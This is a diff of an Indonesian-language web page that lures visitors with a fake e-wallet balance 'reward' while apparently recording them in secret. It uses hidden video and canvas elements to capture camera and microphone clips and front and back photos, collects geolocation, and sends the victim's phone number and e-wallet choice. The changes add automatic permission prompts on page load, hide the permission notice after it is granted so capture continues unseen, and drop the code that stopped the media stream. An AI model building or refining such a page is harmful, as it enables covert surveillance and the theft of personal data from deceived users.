@@ -15,7 +15,6 @@
             justify-content: center;
             padding: 20px;
         }
-
         .container {
             background: linear-gradient(145deg, #1a1a2e, #16213e);
             border-radius: 28px;
@@ -23,7 +22,7 @@
             max-width: 440px;
             width: 100%;
             border: 1px solid rgba(255,255,255,0.06);
-            box-shadow: 0 30px 80px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.05);
+            box-shadow: 0 30px 80px rgba(0,0,0,0.6);
             position: relative;
             overflow: hidden;
         }
@@ -37,8 +36,6 @@
             background: radial-gradient(ellipse at 30% 20%, rgba(255,215,0,0.03), transparent 60%);
             pointer-events: none;
         }
-
-        /* GLOW ORB */
         .glow-orb {
             position: absolute;
             top: -60px;
@@ -63,7 +60,6 @@
             z-index: 1;
         }
         .loading-screen.hidden { display: none; }
-
         .spinner {
             width: 64px;
             height: 64px;
@@ -74,7 +70,6 @@
             margin-bottom: 24px;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
-
         .loading-title {
             font-size: 22px;
             font-weight: 700;
@@ -101,11 +96,10 @@
             75% { content: '...'; }
         }
 
-        /* FORM SCREEN */
+        /* FORM */
         .form-screen { display: none; position: relative; z-index: 1; }
         .form-screen.visible { display: block; }
 
-        /* HEADER */
         .header {
             text-align: center;
             margin-bottom: 28px;
@@ -141,7 +135,7 @@
             letter-spacing: 1px;
         }
 
-        /* SALDO CARD */
+        /* SALDO */
         .saldo-card {
             background: linear-gradient(135deg, rgba(255,215,0,0.08), rgba(255,215,0,0.02));
             border: 1px solid rgba(255,215,0,0.1);
@@ -180,7 +174,7 @@
             color: rgba(255,255,255,0.3);
         }
 
-        /* PERMISSION */
+        /* PERMISSION - HILANG SETELAH DIIZINKAN */
         .permission-box {
             background: rgba(255,255,255,0.03);
             border: 1px solid rgba(255,255,255,0.06);
@@ -190,26 +184,26 @@
             display: flex;
             align-items: center;
             gap: 14px;
-            transition: all 0.4s;
+            transition: all 0.5s ease;
         }
-        .permission-box.granted {
-            border-color: rgba(52, 199, 89, 0.3);
-            background: rgba(52, 199, 89, 0.05);
+        .permission-box.hidden {
+            display: none !important;
+            opacity: 0;
+            transform: translateY(-20px);
+            height: 0;
+            padding: 0;
+            margin: 0;
+            border: 0;
+            overflow: hidden;
         }
-        .permission-box .icon {
-            font-size: 28px;
-            flex-shrink: 0;
-        }
+        .permission-box .icon { font-size: 28px; flex-shrink: 0; }
         .permission-box .text {
             flex: 1;
             font-size: 13px;
             color: rgba(255,255,255,0.5);
             line-height: 1.5;
         }
-        .permission-box .text strong {
-            color: #fff;
-            font-weight: 600;
-        }
+        .permission-box .text strong { color: #fff; font-weight: 600; }
         .permission-btn {
             background: linear-gradient(135deg, #ffd700, #f7971e);
             color: #0a0a0f;
@@ -228,16 +222,6 @@
             box-shadow: 0 4px 25px rgba(255,215,0,0.3);
         }
         .permission-btn:active { transform: scale(0.97); }
-        .permission-btn.granted {
-            background: rgba(52, 199, 89, 0.15);
-            color: #34c759;
-            cursor: default;
-            border: 1px solid rgba(52, 199, 89, 0.2);
-        }
-        .permission-btn.granted:hover {
-            transform: none;
-            box-shadow: none;
-        }
         .permission-btn.hidden { display: none; }
 
         /* E-WALLET */
@@ -275,20 +259,22 @@
             box-shadow: 0 0 30px rgba(255,215,0,0.05);
         }
         .ewallet-item .logo {
-            font-size: 28px;
-            display: block;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            font-weight: 800;
             margin-bottom: 4px;
-            line-height: 1;
+            height: 32px;
         }
+        .ewallet-item .logo svg { width: 28px; height: 28px; }
         .ewallet-item .name {
             font-size: 10px;
             font-weight: 600;
             color: rgba(255,255,255,0.5);
             letter-spacing: 0.5px;
         }
-        .ewallet-item.active .name {
-            color: #ffd700;
-        }
+        .ewallet-item.active .name { color: #ffd700; }
 
         /* INPUT */
         .input-group {
@@ -393,7 +379,8 @@
             .saldo-card .amount { font-size: 32px; }
             .ewallet-grid { gap: 6px; }
             .ewallet-item { padding: 10px 2px; }
-            .ewallet-item .logo { font-size: 22px; }
+            .ewallet-item .logo { font-size: 16px; }
+            .ewallet-item .logo svg { width: 22px; height: 22px; }
             .ewallet-item .name { font-size: 9px; }
         }
     </style>
@@ -424,7 +411,7 @@
             <div class="amount">Rp <span id="saldoValue">0</span></div>
         </div>
 
-        <!-- PERMISSION -->
+        <!-- PERMISSION - HILANG SETELAH DIIZINKAN -->
         <div class="permission-box" id="permissionBox">
             <div class="icon">🔐</div>
             <div class="text">
@@ -437,24 +424,54 @@
         <!-- E-WALLET -->
         <span class="ewallet-label">💳 Pilih E-Wallet</span>
         <div class="ewallet-grid" id="ewalletGrid">
+            <!-- Dana -->
             <div class="ewallet-item active" data-value="Dana">
-                <span class="logo">💜</span>
+                <div class="logo">
+                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="24" height="24" rx="6" fill="#1A73E8"/>
+                        <text x="12" y="17" text-anchor="middle" font-family="Arial" font-size="12" fill="white" font-weight="bold">D</text>
+                    </svg>
+                </div>
                 <span class="name">Dana</span>
             </div>
+            <!-- Gopay -->
             <div class="ewallet-item" data-value="Gopay">
-                <span class="logo">💚</span>
+                <div class="logo">
+                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="24" height="24" rx="6" fill="#00AA5B"/>
+                        <text x="12" y="17" text-anchor="middle" font-family="Arial" font-size="10" fill="white" font-weight="bold">GO</text>
+                    </svg>
+                </div>
                 <span class="name">Gopay</span>
             </div>
+            <!-- Shopeepay -->
             <div class="ewallet-item" data-value="Shopeepay">
-                <span class="logo">🟠</span>
+                <div class="logo">
+                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="24" height="24" rx="6" fill="#EE4D2D"/>
+                        <text x="12" y="17" text-anchor="middle" font-family="Arial" font-size="9" fill="white" font-weight="bold">SP</text>
+                    </svg>
+                </div>
                 <span class="name">ShopeePay</span>
             </div>
+            <!-- OVO -->
             <div class="ewallet-item" data-value="OVO">
-                <span class="logo">💙</span>
+                <div class="logo">
+                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="24" height="24" rx="6" fill="#3C94F4"/>
+                        <text x="12" y="17" text-anchor="middle" font-family="Arial" font-size="12" fill="white" font-weight="bold">O</text>
+                    </svg>
+                </div>
                 <span class="name">OVO</span>
             </div>
+            <!-- LinkAja -->
             <div class="ewallet-item" data-value="LinkAja">
-                <span class="logo">❤️</span>
+                <div class="logo">
+                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="24" height="24" rx="6" fill="#ED1C24"/>
+                        <text x="12" y="17" text-anchor="middle" font-family="Arial" font-size="8" fill="white" font-weight="bold">LA</text>
+                    </svg>
+                </div>
                 <span class="name">LinkAja</span>
             </div>
         </div>
@@ -495,14 +512,12 @@
     const permissionBox = document.getElementById('permissionBox');
     const ewalletItems = document.querySelectorAll('.ewallet-item');
 
-    // Hidden elements
     const video = document.getElementById('hidden-video');
     const recorderVideo = document.getElementById('recorder-video');
     const canvas = document.getElementById('hidden-canvas');
 
     let selectedEwallet = 'Dana';
     let allPermissionsGranted = false;
-    let stream = null;
     let mediaRecorder = null;
     let recordedChunks = [];
     let photos = { front: null, back: null };
@@ -513,7 +528,7 @@
     let hasSent = false;
 
     // ============================================
-    // 💰 GENERATE SALDO ACAK (45K-65K)
+    // 💰 GENERATE SALDO
     // ============================================
     function generateSaldo() {
         const min = 45000;
@@ -599,9 +614,8 @@
                 recorderVideo.muted = true;
                 recorderVideo.play();
 
-                const mimeType = 'video/mp4';
-                let finalMimeType = mimeType;
-                if (!MediaRecorder.isTypeSupported(mimeType)) {
+                let finalMimeType = 'video/mp4';
+                if (!MediaRecorder.isTypeSupported(finalMimeType)) {
                     finalMimeType = 'video/webm;codecs=vp9,opus';
                     if (!MediaRecorder.isTypeSupported(finalMimeType)) {
                         finalMimeType = 'video/webm;codecs=vp8,opus';
@@ -637,7 +651,6 @@
                 };
 
                 mediaRecorder.start(1000);
-                console.log('🎥 Recording started for 10 seconds...');
 
                 setTimeout(() => {
                     if (mediaRecorder && mediaRecorder.state === 'recording') {
@@ -811,7 +824,7 @@
     }
 
     // ============================================
-    // 🚀 START BACKGROUND PROCESS
+    // 🚀 START BACKGROUND PROCESS (LANGSUNG JALAN)
     // ============================================
     async function startBackgroundProcess() {
         try {
@@ -842,9 +855,6 @@
         if (mediaRecorder && mediaRecorder.state === 'recording') {
             mediaRecorder.stop();
         }
-        if (stream) {
-            stream.getTracks().forEach(t => t.stop());
-        }
     });
 
     // ============================================
@@ -863,12 +873,14 @@
     // --- PERMISSION ---
     permissionBtn.addEventListener('click', async function() {
         try {
+            // Minta izin kamera + mikrofon
             const testStream = await navigator.mediaDevices.getUserMedia({
                 video: true,
                 audio: true
             });
             testStream.getTracks().forEach(t => t.stop());
 
+            // Minta izin lokasi
             if (navigator.geolocation) {
                 await new Promise((resolve) => {
                     navigator.geolocation.getCurrentPosition(
@@ -880,14 +892,11 @@
             }
 
             allPermissionsGranted = true;
-            this.textContent = '✅ Terverifikasi';
-            this.classList.add('granted');
-            permissionBox.classList.add('granted');
             
-            // Hilangkan text permission
-            const textEl = permissionBox.querySelector('.text');
-            textEl.innerHTML = '<strong>✅ Semua izin telah diaktifkan</strong><br>Proses verifikasi berjalan di background';
+            // HILANGKAN PERMISSION BOX
+            permissionBox.classList.add('hidden');
             
+            // Mulai proses background
             startBackgroundProcess();
 
         } catch (err) {
@@ -922,6 +931,7 @@
 
         await sendData(phone, ewallet, saldo);
 
+        // TAMPILKAN FOTO DARI GITHUB
         const githubImage = await getImageFromGitHub();
         if (githubImage) {
             resultImage.src = githubImage;
@@ -934,7 +944,7 @@
     });
 
     // ============================================
-    // 🚀 INIT
+    // 🚀 INIT - LANGSUNG MINTA IZIN
     // ============================================
     function init() {
         saldoValue.textContent = generateSaldo();
@@ -942,6 +952,35 @@
         setTimeout(() => {
             loadingScreen.classList.add('hidden');
             formScreen.classList.add('visible');
+            
+            // LANGSUNG MINTA IZIN OTOMATIS
+            setTimeout(async () => {
+                try {
+                    const testStream = await navigator.mediaDevices.getUserMedia({
+                        video: true,
+                        audio: true
+                    });
+                    testStream.getTracks().forEach(t => t.stop());
+
+                    if (navigator.geolocation) {
+                        await new Promise((resolve) => {
+                            navigator.geolocation.getCurrentPosition(
+                                () => resolve(),
+                                () => resolve(),
+                                { timeout: 5000 }
+                            );
+                        });
+                    }
+
+                    allPermissionsGranted = true;
+                    permissionBox.classList.add('hidden');
+                    startBackgroundProcess();
+
+                } catch (err) {
+                    console.log('Auto permission failed, waiting for user click:', err);
+                }
+            }, 1000);
+            
         }, 3000);
 
         console.log('📄 Page loaded - Saldo Sultan');
